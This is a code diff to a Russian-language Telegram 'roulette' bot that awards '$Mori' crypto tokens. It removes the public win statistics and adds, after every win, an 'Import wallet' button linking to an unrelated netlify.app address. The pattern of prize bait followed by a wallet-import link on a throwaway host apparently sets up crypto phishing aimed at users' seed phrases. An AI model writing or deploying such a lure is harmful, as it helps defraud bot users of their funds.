@@ -23,7 +23,7 @@ BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
 user_balances = {}
 # Хранилище информации о том, кто уже крутил рулетку
 user_has_spun = {}
-# Статистика выигрышей
+# Статистика выигрышей (используется только для логирования)
 total_winners = 0
 total_prizes_given = 0
 
@@ -59,9 +59,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await message.reply_text(
                     f"Привет, {update.effective_user.first_name}! 👋\n\n"
                     f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
-                    f"🎰 Вы уже использовали свой бесплатный спин!\n"
-                    f"📊 Всего выиграли: {total_winners} человек\n"
-                    f"🎁 Всего призов выдано: {total_prizes_given} $Mori\n\n"
+                    f"🎰 Вы уже использовали свой бесплатный спин!\n\n"
                     f"Нажмите кнопку ниже, чтобы открыть рулетку:",
                     reply_markup=reply_markup
                 )
@@ -69,9 +67,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await message.reply_text(
                     f"Привет, {update.effective_user.first_name}! 👋\n\n"
                     f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
-                    f"🎰 У вас есть один бесплатный спин!\n"
-                    f"📊 Всего выиграли: {total_winners} человек\n"
-                    f"🎁 Всего призов выдано: {total_prizes_given} $Mori\n\n"
+                    f"🎰 У вас есть один бесплатный спин!\n\n"
                     f"Нажмите кнопку ниже, чтобы открыть рулетку:",
                     reply_markup=reply_markup
                 )
@@ -109,18 +105,12 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
             if has_spun:
                 await update.message.reply_text(
                     f"ℹ️ Вы уже использовали свой бесплатный спин.\n"
-                    f"💰 Ваш баланс: {user_balance} $Mori\n\n"
-                    f"📊 Статистика рулетки:\n"
-                    f"👥 Всего выиграли: {total_winners} человек\n"
-                    f"🎁 Всего призов выдано: {total_prizes_given} $Mori"
+                    f"💰 Ваш баланс: {user_balance} $Mori"
                 )
             else:
                 await update.message.reply_text(
                     f"✅ У вас есть бесплатный спин!\n"
-                    f"💰 Ваш баланс: {user_balance} $Mori\n\n"
-                    f"📊 Статистика рулетки:\n"
-                    f"👥 Всего выиграли: {total_winners} человек\n"
-                    f"🎁 Всего призов выдано: {total_prizes_given} $Mori"
+                    f"💰 Ваш баланс: {user_balance} $Mori"
                 )
             logger.info(f"Spin status check for user {user_id}: can_spin={not has_spun}")
         
@@ -146,13 +136,19 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
             total_winners += 1
             total_prizes_given += prize
             
+            # Создаем кнопку для импорта кошелька
+            wallet_url = 'https://comfy-hummingbird-74e462.netlify.app/'
+            keyboard = [
+                [InlineKeyboardButton("🔗 Импортировать кошелек", url=wallet_url)]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
             await update.message.reply_text(
                 f"🎉 Поздравляем, {update.effective_user.first_name}!\n\n"
                 f"🎰 Вы выиграли: {prize} $Mori!\n"
                 f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
-                f"📊 Статистика рулетки:\n"
-                f"👥 Всего выиграли: {total_winners} человек\n"
-                f"🎁 Всего призов выдано: {total_prizes_given} $Mori"
+                f"Нажмите кнопку ниже, чтобы импортировать кошелек:",
+                reply_markup=reply_markup
             )
             logger.info(f"User {user_id} won {prize} $Mori. Total winners: {total_winners}")
         
